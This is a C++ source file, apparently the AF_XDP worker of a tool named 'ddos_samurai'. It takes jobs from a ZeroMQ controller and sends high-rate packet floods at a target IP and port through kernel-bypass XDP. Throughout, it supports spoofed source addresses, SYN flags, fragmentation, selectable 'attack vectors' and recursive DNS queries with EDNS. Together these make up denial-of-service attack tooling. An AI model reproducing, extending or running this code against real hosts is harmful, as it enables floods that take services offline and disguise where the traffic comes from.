#include <algorithm>
#include <chrono>
#include <cmath>
#include <cstdint>
#include <cstring>
#include <cctype>
#include <cstdlib>
#include <dlfcn.h>
#include <unistd.h>
#include <exception>
#include <iostream>
#include <optional>
#include <string>
#include <thread>
#include <vector>

#include <zmq.h>

#include "../../ddos_samurai/xdp_native_api.h"
#include "engine.hpp"
#include "pacing_engine.h"
#include "wire_protocol.h"
#include "zmq_worker_base.hpp"
#include "worker_common.hpp"

namespace {
using samurai::daemon::BuildSnapshot;
using samurai::daemon::JsonError;
using samurai::daemon::PacingFromEnvelope;
using samurai::daemon::ReadFixed;
using samurai::daemon::SerializeSnapshot;

using ddos_samurai::cpu_native::PacketConfig;
using ddos_samurai::cpu_native::SpoofOptions;

constexpr const char* kDefaultJobs = "ipc:///tmp/samurai_jobs_afxdp";
constexpr const char* kDefaultEvents = "ipc:///tmp/samurai_events_afxdp";

using fn_xdp_get_native_api_v1_t = xdp_native_api_v1* (*)();

struct XdpNativeBridge {
  void* handle{nullptr};
  xdp_native_api_v1* api{nullptr};
  std::string lib_path;
};

struct XdpCtxGuard {
  XdpNativeBridge* bridge{nullptr};
  int handle{-1};
  ~XdpCtxGuard() {
    if (bridge && bridge->api && handle > 0 && bridge->api->destroy_ctx) {
      char err[160];
      err[0] = '\0';
      (void)bridge->api->destroy_ctx(handle, err, sizeof(err));
    }
  }
};


std::optional<int> OptionalIntFromWire(std::uint64_t raw) {
  if (raw == 0ull) return std::nullopt;
  return static_cast<int>(raw);
}

PacketConfig ConfigFromEnvelope(const samurai::wire::JobEnvelopeV1& env) {
  PacketConfig cfg;
  cfg.target_ip = ReadFixed(env.target_ip, sizeof(env.target_ip));
  cfg.target_port = static_cast<int>(env.target_port);
  cfg.protocol = ReadFixed(env.protocol, sizeof(env.protocol));
  if (cfg.protocol.empty()) cfg.protocol = "tcp";
  cfg.spoof = env.spoof_enabled != 0u;
  cfg.spoof_opts = SpoofOptions{
      .mode = ReadFixed(env.spoof_mode, sizeof(env.spoof_mode)),
      .subnet = [&]() -> std::optional<std::string> {
        const std::string v = ReadFixed(env.spoof_subnet, sizeof(env.spoof_subnet));
        return v.empty() ? std::nullopt : std::optional<std::string>(v);
      }(),
      .list_file = [&]() -> std::optional<std::string> {
        const std::string v = ReadFixed(env.spoof_list_file, sizeof(env.spoof_list_file));
        return v.empty() ? std::nullopt : std::optional<std::string>(v);
      }(),
  };
  cfg.has_payload = env.has_payload != 0u;
  cfg.tcp_flags = ReadFixed(env.tcp_flags, sizeof(env.tcp_flags));
  if (cfg.tcp_flags.empty()) cfg.tcp_flags = "S";
  cfg.ttl = OptionalIntFromWire(env.ttl);
  cfg.tos = OptionalIntFromWire(env.tos);
  cfg.window = OptionalIntFromWire(env.window);
  cfg.fragment_enabled = env.fragment_enabled != 0u;
  cfg.fragment_size = static_cast<int>(env.fragment_size);
  cfg.pad_size = static_cast<int>(env.pad_size);
  cfg.attack_vector = ReadFixed(env.attack_vector, sizeof(env.attack_vector));
  if (cfg.attack_vector.empty()) cfg.attack_vector = "basic";
  cfg.dns_name = ReadFixed(env.dns_name, sizeof(env.dns_name));
  if (cfg.dns_name.empty()) cfg.dns_name = "example.com";
  cfg.dns_edns = env.dns_edns != 0u;
  cfg.dns_recursive = env.dns_recursive != 0u;

  const std::string qtypes_raw = ReadFixed(env.dns_qtype, sizeof(env.dns_qtype));
  if (!qtypes_raw.empty()) {
    cfg.dns_qtypes.clear();
    std::size_t start = 0;
    while (start < qtypes_raw.size()) {
      const std::size_t comma = qtypes_raw.find(',', start);
      const std::size_t end = (comma == std::string::npos) ? qtypes_raw.size() : comma;
      const std::string part = qtypes_raw.substr(start, end - start);
      if (!part.empty()) cfg.dns_qtypes.push_back(part);
      if (comma == std::string::npos) break;
      start = comma + 1;
    }
  }
  return cfg;
}


std::string GetExeDir() {
  char buf[4096];
  const ssize_t len = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
  if (len <= 0) return ".";
  buf[len] = '\0';
  std::string exe(buf);
  const auto slash = exe.rfind('/');
  if (slash == std::string::npos) return ".";
  return exe.substr(0, slash);
}

std::vector<std::string> CandidateNativeLibs() {
  std::vector<std::string> out;

  // 1. Explicit env var (absolute path) — highest priority.
  const char* env = std::getenv("SAMURAI_XDP_NATIVE_LIB");
  if (env && *env) out.emplace_back(env);

  // 2. Paths relative to the executable directory (build-workers/../...).
  const std::string exe_dir = GetExeDir();
  const std::string repo_root = exe_dir + "/..";
  // Direct repo source tree
  out.emplace_back(repo_root + "/ddos_samurai/xdp_sender.so");
  // cpython-tagged builds for 3.11 and 3.12
  out.emplace_back(repo_root + "/build/lib.linux-x86_64-cpython-311/ddos_samurai/xdp_sender.cpython-311-x86_64-linux-gnu.so");
  out.emplace_back(repo_root + "/build/lib.linux-x86_64-cpython-312/ddos_samurai/xdp_sender.cpython-312-x86_64-linux-gnu.so");
  out.emplace_back(repo_root + "/build/lib.linux-x86_64-cpython-310/ddos_samurai/xdp_sender.cpython-310-x86_64-linux-gnu.so");
  out.emplace_back(repo_root + "/ddos_samurai/xdp_sender.cpython-312-x86_64-linux-gnu.so");
  out.emplace_back(repo_root + "/ddos_samurai/xdp_sender.cpython-311-x86_64-linux-gnu.so");
  out.emplace_back(repo_root + "/ddos_samurai/xdp_sender.cpython-310-x86_64-linux-gnu.so");

  // 3. Legacy relative-to-CWD paths (kept for backward compat).
  out.emplace_back("ddos_samurai/xdp_sender.so");
  out.emplace_back("xdp_sender.so");
  out.emplace_back("ddos_samurai/xdp_sender.cpython-312-x86_64-linux-gnu.so");
  out.emplace_back("ddos_samurai/xdp_sender.cpython-311-x86_64-linux-gnu.so");
  out.emplace_back("ddos_samurai/xdp_sender.cpython-310-x86_64-linux-gnu.so");
  return out;
}

bool LoadXdpNative(XdpNativeBridge& out, std::string& err) {
  if (out.handle && out.api) return true;
  std::string last_dlerror;
  const auto candidates = CandidateNativeLibs();
  for (const std::string& p : candidates) {
    dlerror();  // Clear previous error.
    void* h = dlopen(p.c_str(), RTLD_NOW | RTLD_LOCAL);
    if (!h) {
      const char* de = dlerror();
      if (de) last_dlerror = de;
      continue;
    }
    auto fn = reinterpret_cast<fn_xdp_get_native_api_v1_t>(dlsym(h, "samurai_xdp_get_native_api_v1"));
    if (!fn) {
      const char* de = dlerror();
      if (de) last_dlerror = std::string("dlsym failed: ") + de;
      dlclose(h);
      continue;
    }
    xdp_native_api_v1* api = fn();
    if (!api || api->version != XDP_NATIVE_API_VERSION || !api->create_ctx || !api->destroy_ctx || !api->send_buffer || !api->get_stats) {
      last_dlerror = "xdp_native_api version/vtable mismatch (got=" + std::to_string(api ? api->version : -1) + " expected=" + std::to_string(XDP_NATIVE_API_VERSION) + ")";
      dlclose(h);
      continue;
    }
    out.handle = h;
    out.api = api;
    out.lib_path = p;
    std::cerr << "[afxdp_worker] loaded native lib: " << p << "\n";
    return true;
  }
  err = "xdp_native_lib_unavailable";
  if (!last_dlerror.empty()) {
    err += ": " + last_dlerror;
  }
  // Log all attempted paths for diagnostics.
  std::cerr << "[afxdp_worker] FATAL: failed to load xdp native lib. Tried:\n";
  for (const std::string& p : candidates) {
    std::cerr << "  - " << p << "\n";
  }
  if (!last_dlerror.empty()) {
    std::cerr << "  last dlerror: " << last_dlerror << "\n";
  }
  return false;
}

int SendFrame(
    void* event_socket,
    std::uint8_t msg_type,
    std::uint64_t correlation_id,
    samurai::wire::WorkerKind worker_kind,
    const std::string& job_id,
    const std::vector<std::uint8_t>& payload = {}) {
  samurai::wire::SamuraiWireHeaderV1 header = samurai::daemon::MakeHeader(
      msg_type,
      static_cast<std::uint32_t>(payload.size()),
      correlation_id,
      worker_kind,
      job_id);
  zmq_msg_t msg;
  const std::size_t total = sizeof(header) + payload.size();
  if (zmq_msg_init_size(&msg, total) != 0) return -1;
  auto* p = static_cast<std::uint8_t*>(zmq_msg_data(&msg));
  std::memcpy(p, &header, sizeof(header));
  if (!payload.empty()) std::memcpy(p + sizeof(header), payload.data(), payload.size());
  const int rc = zmq_msg_send(&msg, event_socket, 0);
  zmq_msg_close(&msg);
  return rc;
}


std::vector<std::uint8_t> JsonDone(
    std::uint64_t correlation_id,
    const std::string& job_id,
    std::uint64_t packets_sent,
    std::uint64_t packets_errors,
    std::uint64_t bytes_sent,
    double actual_rps,
    double rate_accuracy_pct,
    int xdp_mode_effective,
    int xdp_queue_id) {
  const std::string json =
      "{\"status\":\"ok\",\"worker_kind\":\"afxdp\",\"correlation_id\":" +
      std::to_string(correlation_id) +
      ",\"job_id\":\"" + job_id +
      "\",\"packets_sent\":" + std::to_string(packets_sent) +
      ",\"packets_errors\":" + std::to_string(packets_errors) +
      ",\"bytes_sent\":" + std::to_string(bytes_sent) +
      ",\"actual_rps\":" + std::to_string(actual_rps) +
      ",\"rate_accuracy_pct\":" + std::to_string(rate_accuracy_pct) +
      ",\"xdp_mode_effective\":" + std::to_string(xdp_mode_effective) +
      ",\"xdp_queue_id\":" + std::to_string(xdp_queue_id) +
      ",\"note\":\"xdp_native_api+cpu_native+pacing_static\"}";
  return std::vector<std::uint8_t>(json.begin(), json.end());
}



int SendAck(void* push, std::uint64_t cid, const std::string& job_id) {
  return SendFrame(push, static_cast<std::uint8_t>(samurai::wire::MessageType::ACK), cid, samurai::wire::WorkerKind::AF_XDP, job_id);
}

}  // namespace

int main(int argc, char** argv) {
  std::string jobs_ep = kDefaultJobs;
  std::string events_ep = kDefaultEvents;
  bool bind_jobs = true;
  bool bind_events = false;
  int cli_queue_id = -1;
  int cli_mode = -1;
  int cli_batch_size = 2048;
  std::string cli_iface;

  for (int i = 1; i < argc; ++i) {
    std::string arg = argv[i];
    if (arg == "--job-endpoint" && i + 1 < argc) {
      jobs_ep = argv[++i];
    } else if (arg == "--event-endpoint" && i + 1 < argc) {
      events_ep = argv[++i];
    } else if (arg == "--jobs-mode" && i + 1 < argc) {
      bind_jobs = std::string(argv[++i]) == "bind";
    } else if (arg == "--events-mode" && i + 1 < argc) {
      bind_events = std::string(argv[++i]) == "bind";
    } else if (arg == "--xdp-interface" && i + 1 < argc) {
      cli_iface = argv[++i];
    } else if (arg == "--xdp-queue-id" && i + 1 < argc) {
      cli_queue_id = std::stoi(argv[++i]);
    } else if (arg == "--xdp-mode" && i + 1 < argc) {
      cli_mode = std::stoi(argv[++i]);
    } else if (arg == "--xdp-batch-size" && i + 1 < argc) {
      cli_batch_size = std::max(1, std::stoi(argv[++i]));
    }
  }

  void* ctx = zmq_ctx_new();
  if (!ctx) {
    std::cerr << "zmq_ctx_new failed\n";
    return 1;
  }

  void* pull = zmq_socket(ctx, ZMQ_PULL);
  void* push = zmq_socket(ctx, ZMQ_PUSH);
  if (!pull || !push) {
    std::cerr << "zmq_socket failed\n";
    if (pull) zmq_close(pull);
    if (push) zmq_close(push);
    zmq_ctx_term(ctx);
    return 1;
  }

  if ((bind_jobs ? zmq_bind(pull, jobs_ep.c_str()) : zmq_connect(pull, jobs_ep.c_str())) != 0) {
    std::cerr << "jobs socket init failed: " << jobs_ep << "\n";
    zmq_close(pull);
    zmq_close(push);
    zmq_ctx_term(ctx);
    return 1;
  }
  if ((bind_events ? zmq_bind(push, events_ep.c_str()) : zmq_connect(push, events_ep.c_str())) != 0) {
    std::cerr << "events socket init failed: " << events_ep << "\n";
    zmq_close(pull);
    zmq_close(push);
    zmq_ctx_term(ctx);
    return 1;
  }

  XdpNativeBridge xdp{};
  bool running = true;
  while (running) {
    zmq_msg_t msg;
    zmq_msg_init(&msg);
    const int n = zmq_msg_recv(&msg, pull, 0);
    if (n <= 0) {
      zmq_msg_close(&msg);
      continue;
    }

    const std::size_t sz = static_cast<std::size_t>(zmq_msg_size(&msg));
    if (sz < sizeof(samurai::wire::SamuraiWireHeaderV1)) {
      zmq_msg_close(&msg);
      continue;
    }

    const auto* raw = static_cast<const std::uint8_t*>(zmq_msg_data(&msg));
    samurai::wire::SamuraiWireHeaderV1 header{};
    std::memcpy(&header, raw, sizeof(header));
    const std::size_t payload_len = sz - sizeof(header);
    const std::uint8_t* payload_ptr = raw + sizeof(header);

    if (!samurai::wire::IsHeaderV1Compatible(header)) {
      zmq_msg_close(&msg);
      continue;
    }

    const auto msg_type = static_cast<samurai::wire::MessageType>(header.msg_type);
    const std::string job_id = samurai::daemon::ReadJobId(header);

    if (msg_type == samurai::wire::MessageType::SHUTDOWN) {
      (void)SendAck(push, header.correlation_id, job_id);
      running = false;
      zmq_msg_close(&msg);
      continue;
    }

    if (msg_type == samurai::wire::MessageType::STOP_JOB) {
      zmq_msg_close(&msg);
      (void)SendAck(push, header.correlation_id, job_id);
      const std::string stopped = "{\"status\":\"stopped\",\"worker_kind\":\"afxdp\"}";
      (void)SendFrame(
          push,
          static_cast<std::uint8_t>(samurai::wire::MessageType::JOB_DONE),
          header.correlation_id,
          samurai::wire::WorkerKind::AF_XDP,
          job_id,
          std::vector<std::uint8_t>(stopped.begin(), stopped.end()));
      continue;
    }

    if (msg_type == samurai::wire::MessageType::START_JOB) {
      if (payload_len != sizeof(samurai::wire::JobEnvelopeV1) ||
          header.payload_len != sizeof(samurai::wire::JobEnvelopeV1)) {
        (void)SendFrame(
            push,
            static_cast<std::uint8_t>(samurai::wire::MessageType::ERROR),
            header.correlation_id,
            samurai::wire::WorkerKind::AF_XDP,
            job_id,
            JsonError("job_envelope_size_mismatch"));
        zmq_msg_close(&msg);
        continue;
      }
      samurai::wire::JobEnvelopeV1 env{};
      std::memcpy(&env, payload_ptr, sizeof(env));
      (void)SendAck(push, header.correlation_id, job_id);
      zmq_msg_close(&msg);

      try {
        std::string load_err;
        if (!LoadXdpNative(xdp, load_err)) {
          (void)SendFrame(
              push,
              static_cast<std::uint8_t>(samurai::wire::MessageType::ERROR),
              header.correlation_id,
              samurai::wire::WorkerKind::AF_XDP,
              job_id,
              JsonError(load_err));
          continue;
        }
        if (!xdp.api->create_ctx || !xdp.api->send_buffer || !xdp.api->destroy_ctx || !xdp.api->get_stats) {
          (void)SendFrame(
              push,
              static_cast<std::uint8_t>(samurai::wire::MessageType::ERROR),
              header.correlation_id,
              samurai::wire::WorkerKind::AF_XDP,
              job_id,
              JsonError("xdp_native_api_incomplete"));
          continue;
        }

        const std::string iface_env = (std::getenv("SAMURAI_XDP_IFACE") ? std::getenv("SAMURAI_XDP_IFACE") : "");
        const std::string iface_wire = ReadFixed(env.xdp_interface, sizeof(env.xdp_interface));
        const std::string iface = !cli_iface.empty() ? cli_iface : (!iface_wire.empty() ? iface_wire : iface_env);
        if (iface.empty()) {
          (void)SendFrame(
              push,
              static_cast<std::uint8_t>(samurai::wire::MessageType::ERROR),
              header.correlation_id,
              samurai::wire::WorkerKind::AF_XDP,
              job_id,
              JsonError("xdp_interface_required"));
          continue;
        }

        const int queue_id = std::max(0, cli_queue_id >= 0 ? cli_queue_id : static_cast<int>(env.xdp_queue_id));
        const int mode = std::max(0, cli_mode >= 0 ? cli_mode : static_cast<int>(env.xdp_mode));
        const int packet_count = std::max(1, static_cast<int>(env.packet_count));

        char xdp_err[160];
        xdp_err[0] = '\0';
        XdpCtxGuard ctx_guard{};
        ctx_guard.bridge = &xdp;
        ctx_guard.handle = xdp.api->create_ctx(iface.c_str(), queue_id, mode, xdp_err, sizeof(xdp_err));
        if (ctx_guard.handle <= 0) {
          const std::string msg = xdp_err[0] ? std::string(xdp_err) : "xdp_create_ctx_failed";
          (void)SendFrame(
              push,
              static_cast<std::uint8_t>(samurai::wire::MessageType::ERROR),
              header.correlation_id,
              samurai::wire::WorkerKind::AF_XDP,
              job_id,
              JsonError(msg));
          continue;
        }

        PacketConfig cfg = ConfigFromEnvelope(env);
        const auto pool = ddos_samurai::cpu_native::generate_packet_pool_view(cfg, packet_count, true, true);
        const std::size_t stride = pool.packet_size;
        if (stride == 0 || pool.size() < stride) {
          (void)SendFrame(
              push,
              static_cast<std::uint8_t>(samurai::wire::MessageType::ERROR),
              header.correlation_id,
              samurai::wire::WorkerKind::AF_XDP,
              job_id,
              JsonError("packet_pool_empty"));
          continue;
        }

        samurai_pacing_config_t pace_cfg = PacingFromEnvelope(env);
        samurai_pacing_state_t pace_state{};
        samurai_pacing_init(&pace_state, &pace_cfg);

        const std::uint64_t start_ns = samurai_pacing_monotonic_now_ns();
        std::uint64_t last_hb_ns = start_ns;
        std::uint64_t last_metric_ns = start_ns;
        std::uint64_t packets_sent = 0;
        std::uint64_t packets_errors = 0;
        std::uint64_t bytes_sent = 0;

        int offset = 0;
        while (offset < packet_count) {
          const int batch = std::min(cli_batch_size, packet_count - offset);
          for (int i = 0; i < batch; ++i) {
            samurai_pacing_wait_next(&pace_state, &pace_cfg);
          }
          int remaining = batch;
          int local_off = 0;
          int retry_zeros = 0;
          while (remaining > 0) {
            const std::uint8_t* buf = pool.data() + (static_cast<std::size_t>(offset + local_off) * stride);
            xdp_err[0] = '\0';
            int sent = 0;
            if (xdp.api->send_buffer_strided) {
              sent = xdp.api->send_buffer_strided(
                  ctx_guard.handle,
                  buf,
                  static_cast<int>(stride),
                  static_cast<int>(stride),
                  remaining,
                  xdp_err,
                  sizeof(xdp_err));
            } else {
              sent = xdp.api->send_buffer(
                  ctx_guard.handle,
                  buf,
                  static_cast<int>(stride),
                  remaining,
                  xdp_err,
                  sizeof(xdp_err));
            }

            if (sent < 0) {
              const std::string msg = xdp_err[0] ? std::string(xdp_err) : "xdp_send_failed";
              (void)SendFrame(
                  push,
                  static_cast<std::uint8_t>(samurai::wire::MessageType::ERROR),
                  header.correlation_id,
                  samurai::wire::WorkerKind::AF_XDP,
                  job_id,
                  JsonError(msg));
              packets_errors += static_cast<std::uint64_t>(remaining);
              remaining = 0;
              break;
            }
            if (sent == 0) {
              retry_zeros += 1;
              if (retry_zeros > 8) {
                packets_errors += static_cast<std::uint64_t>(remaining);
                remaining = 0;
                break;
              }
              std::this_thread::sleep_for(std::chrono::microseconds(100));
              continue;
            }
            retry_zeros = 0;
            packets_sent += static_cast<std::uint64_t>(sent);
            bytes_sent += static_cast<std::uint64_t>(sent) * static_cast<std::uint64_t>(stride);
            local_off += sent;
            remaining -= sent;
          }

          const std::uint64_t now_ns = samurai_pacing_monotonic_now_ns();
          if (now_ns - last_hb_ns >= 1'000'000'000ull) {
            (void)SendFrame(
                push,
                static_cast<std::uint8_t>(samurai::wire::MessageType::HEARTBEAT),
                header.correlation_id,
                samurai::wire::WorkerKind::AF_XDP,
                job_id);
            last_hb_ns = now_ns;
          }
          if (now_ns - last_metric_ns >= 2'000'000'000ull) {
            const samurai::wire::MetricSnapshotV1 snap = BuildSnapshot(
                now_ns, start_ns, packets_sent, packets_errors, bytes_sent, pace_cfg, pace_state);
            (void)SendFrame(
                push,
                static_cast<std::uint8_t>(samurai::wire::MessageType::METRIC_SNAPSHOT),
                header.correlation_id,
                samurai::wire::WorkerKind::AF_XDP,
                job_id,
                SerializeSnapshot(snap));
            last_metric_ns = now_ns;
            last_hb_ns = now_ns;
          }
          offset += batch;
        }

        xdp_native_stats native_stats{};
        xdp_err[0] = '\0';
        if (xdp.api->get_stats(ctx_guard.handle, &native_stats, xdp_err, sizeof(xdp_err)) == 0) {
          packets_sent = std::max<std::uint64_t>(packets_sent, native_stats.tx_packets);
          bytes_sent = std::max<std::uint64_t>(bytes_sent, native_stats.tx_bytes);
          packets_errors = std::max<std::uint64_t>(packets_errors, native_stats.tx_errors);
        }

        const std::uint64_t end_ns = samurai_pacing_monotonic_now_ns();
        const samurai::wire::MetricSnapshotV1 snap = BuildSnapshot(
            end_ns, start_ns, packets_sent, packets_errors, bytes_sent, pace_cfg, pace_state);
        (void)SendFrame(
            push,
            static_cast<std::uint8_t>(samurai::wire::MessageType::METRIC_SNAPSHOT),
            header.correlation_id,
            samurai::wire::WorkerKind::AF_XDP,
            job_id,
            SerializeSnapshot(snap));

        const std::vector<std::uint8_t> done = JsonDone(
            header.correlation_id,
            job_id,
            packets_sent,
            packets_errors,
            bytes_sent,
            snap.actual_rps,
            snap.rate_accuracy_pct,
            native_stats.mode,
            native_stats.queue_id);
        (void)SendFrame(
            push,
            static_cast<std::uint8_t>(samurai::wire::MessageType::JOB_DONE),
            header.correlation_id,
            samurai::wire::WorkerKind::AF_XDP,
            job_id,
            done);
      } catch (const std::exception& exc) {
        (void)SendFrame(
            push,
            static_cast<std::uint8_t>(samurai::wire::MessageType::ERROR),
            header.correlation_id,
            samurai::wire::WorkerKind::AF_XDP,
            job_id,
            JsonError(exc.what()));
      }
      continue;
    }

    zmq_msg_close(&msg);
    (void)SendFrame(
        push,
        static_cast<std::uint8_t>(samurai::wire::MessageType::ERROR),
        header.correlation_id,
        samurai::wire::WorkerKind::AF_XDP,
        job_id,
        JsonError("unsupported_msg_type"));
  }

  if (xdp.handle) {
    dlclose(xdp.handle);
  }
  zmq_close(pull);
  zmq_close(push);
  zmq_ctx_term(ctx);
  return 0;
}
